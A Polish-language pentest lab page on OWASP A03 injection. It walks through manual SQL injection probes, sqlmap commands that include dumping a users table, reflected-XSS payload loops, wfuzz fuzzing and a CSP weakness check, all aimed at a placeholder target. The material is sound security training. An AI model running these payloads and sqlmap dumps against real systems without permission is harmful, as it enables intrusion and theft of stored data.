---
title: A03 — Injection (SQLi + XSS)
sidebar_position: 4
tags: [lab, owasp-a03, sql-injection, xss]
---

# A03 — Injection (SQLi + XSS)

## Zakres laboratorium

- Ręczne wykrywanie SQL injection — sondy oparte na błędach i logice
- sqlmap — automatyczne wykrywanie i eksploatacja SQLi
- XSS reflected — metoda ciągu sygnalizacyjnego (canary) i fuzzing payloadów
- Analiza CSP — sprawdzanie słabości polityki

## Konfiguracja

```bash
TARGET="http://TARGET_IP_OR_DOMAIN"
PORT="80"
WORDLIST="/usr/share/wordlists/dirb/common.txt"
```

## Ćwiczenie 1: Ręczne sondy SQL Injection

Przetestuj endpoint wyszukiwania za pomocą sond iniekcji:

```bash
SQLI_PROBES=(
  "'"
  "\""
  "' OR '1'='1"
  "' OR '1'='1'--"
  "' OR 1=1--"
  "\" OR 1=1--"
  "' OR 1=1#"
  "') OR ('1'='1"
  "1 AND 1=1"
  "1 AND 1=2"
  "' UNION SELECT NULL--"
  "' UNION SELECT NULL,NULL--"
)

for PROBE in "${SQLI_PROBES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PROBE'))")
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/search?q=$ENCODED")
  echo "Probe '$PROBE': HTTP $RESPONSE"
done
```

Oznaki SQLi: błędy HTTP 500, komunikaty błędów bazy danych w treści odpowiedzi, różne rozmiary odpowiedzi między `1 AND 1=1` a `1 AND 1=2`.

## Ćwiczenie 2: sqlmap

### Iniekcja przez parametr GET

```bash
sqlmap -u "$TARGET/search?q=test" \
  --batch \
  --level=3 \
  --risk=2 \
  --dbs
```

### Iniekcja przez parametr POST

```bash
sqlmap -u "$TARGET/login" \
  --data="username=admin&password=test" \
  --batch \
  --level=3 \
  --risk=2
```

### Z ciasteczkiem sesji

```bash
sqlmap -u "$TARGET/profile" \
  --cookie="session=abc123" \
  --batch \
  --dbs
```

### Zrzut konkretnej tabeli

```bash
sqlmap -u "$TARGET/search?q=test" \
  --batch \
  -D database_name \
  -T users \
  --dump
```

:::warning
`--level` i `--risk` kontrolują agresywność testów. Wyższe wartości zwiększają szansę wykrycia i mogą powodować błędy aplikacji. Używaj `--batch` do uruchamiania nieinteraktywnego.
:::

## Ćwiczenie 3: Wykrywanie XSS (Reflected)

### Metoda ciągu sygnalizacyjnego (canary)

Najpierw wstrzyknij unikalny ciąg, aby sprawdzić, czy jest odzwierciedlony w odpowiedzi, zanim przejdziesz do payloadów wykonywalnych:

```bash
CANARY="xsscanary12345"
RESPONSE=$(curl -s "$TARGET/search?q=$CANARY")
if echo "$RESPONSE" | grep -q "$CANARY"; then
  echo "[REFLECTED] Input is reflected — test XSS payloads"
else
  echo "Input not reflected in response"
fi
```

### Payloady XSS

```bash
XSS_PAYLOADS=(
  "<script>alert(1)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=alert(1)>"
  "\"'><script>alert(1)</script>"
  "<ScRiPt>alert(1)</ScRiPt>"
  "<script>alert(String.fromCharCode(88,83,83))</script>"
  "javascript:alert(1)"
  "<iframe src=javascript:alert(1)>"
  "<body onload=alert(1)>"
  "';alert(1)//"
)

for PAYLOAD in "${XSS_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")
  RESPONSE=$(curl -s "$TARGET/search?q=$ENCODED")
  if echo "$RESPONSE" | grep -qi "onerror\|onload\|<script"; then
    echo "[POTENTIAL XSS] Payload not sanitized: $PAYLOAD"
  fi
done
```

### Fuzzing z wfuzz

```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt \
  --hc 404 \
  "$TARGET/search?q=FUZZ"
```

## Ćwiczenie 4: Analiza CSP

Sprawdź nagłówek Content-Security-Policy:

```bash
CSP=$(curl -sI "$TARGET" | grep -i "content-security-policy" | cut -d: -f2-)
echo "CSP: $CSP"
```

Słabości, na które warto zwrócić uwagę:

| Problem | Dlaczego ma znaczenie |
|---------|----------------------|
| `unsafe-inline` | Zezwala na skrypty inline — niweczy ochronę przed XSS |
| `unsafe-eval` | Zezwala na `eval()` — częsty wektor XSS |
| `*` (symbol wieloznaczny) | Zezwala na ładowanie z dowolnej domeny |
| Brak `default-src` | Brak polityki zastępczej |
| `http:` jako dozwolone źródło | Zezwala na mieszaną zawartość |

Użyj [Google CSP Evaluator](https://csp-evaluator.withgoogle.com/), aby interaktywnie przeanalizować politykę.
